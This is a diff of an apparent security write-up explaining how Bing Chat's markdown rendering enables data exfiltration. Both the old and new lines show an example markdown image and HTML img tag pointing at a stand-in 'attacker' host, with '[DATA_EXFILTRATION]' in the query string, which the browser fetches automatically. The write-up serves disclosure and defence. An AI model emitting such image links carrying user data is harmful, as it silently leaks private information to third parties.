@@ -25,13 +25,13 @@ When Bing Chat returns text it can return markdown elements, which the client wi
 Imagine the LLM returns the following text:
 
 ```
-![data exfiltration in progress](https://attacker/q=[DATA_EXFILTRATION])
+![data exfiltration in progress](https://attacker/logo.png?q=[DATA_EXFILTRATION])
 ```
 
 This will be rendered as an HTML image tag with a `src` attribute pointing to the `attacker` server. 
 
 ```
-<img src="https://attacker/q=[DATA_EXFILTRATION]">
+<img src="https://attacker/logo.png?q=[DATA_EXFILTRATION]">
 ```
 
 The browser will automatically connect to the URL without user interaction to load the image.
